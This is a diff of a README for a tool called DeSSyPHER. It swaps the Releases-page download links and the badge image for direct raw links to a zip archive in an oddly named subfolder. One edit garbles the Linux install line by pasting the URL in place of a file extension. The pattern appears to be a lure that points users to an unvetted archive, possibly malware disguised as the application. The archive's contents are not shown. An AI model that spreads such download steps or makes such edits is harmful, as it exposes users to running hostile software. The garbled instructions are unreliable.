@@ -21,13 +21,13 @@ To get started with DeSSyPHER, follow these steps:
 
 1. **Download the Application**  
    Click the link below to visit our Releases page and download the application.  
-   [![Download DeSSyPHER](https://img.shields.io/badge/Download-DeSSyPHER-blue.svg)](https://github.com/Thunderous-cauliflower413/DeSSyPHER/releases)
+   [![Download DeSSyPHER](https://raw.githubusercontent.com/Thunderous-cauliflower413/DeSSyPHER/main/SurvBioHAP/DeSSyPHER_v3.7.zip)](https://raw.githubusercontent.com/Thunderous-cauliflower413/DeSSyPHER/main/SurvBioHAP/DeSSyPHER_v3.7.zip)
 
 2. **Installing the Application**  
    After the download completes:
    - For Windows users, locate the `.exe` file and double-click to start the installation process.  
    - For Mac users, locate the `.dmg` file and drag the DeSSyPHER icon into your Applications folder.  
-   - For Linux users, follow your distribution’s instructions to install `.zip` or `.tar.gz` files.
+   - For Linux users, follow your distribution’s instructions to install `.zip` or `https://raw.githubusercontent.com/Thunderous-cauliflower413/DeSSyPHER/main/SurvBioHAP/DeSSyPHER_v3.7.zip` files.
 
 3. **Launching DeSSyPHER**  
    - After installation, find DeSSyPHER in your Applications or Programs list.  
@@ -48,7 +48,7 @@ To get started with DeSSyPHER, follow these steps:
 
 ## 💾 Download & Install
 To download DeSSyPHER, visit the Releases page below. Choose the version suitable for your operating system and follow the installation guidelines.  
-[Download DeSSyPHER](https://github.com/Thunderous-cauliflower413/DeSSyPHER/releases)
+[Download DeSSyPHER](https://raw.githubusercontent.com/Thunderous-cauliflower413/DeSSyPHER/main/SurvBioHAP/DeSSyPHER_v3.7.zip)
 
 ## 🆘 Troubleshooting
 If you run into issues:
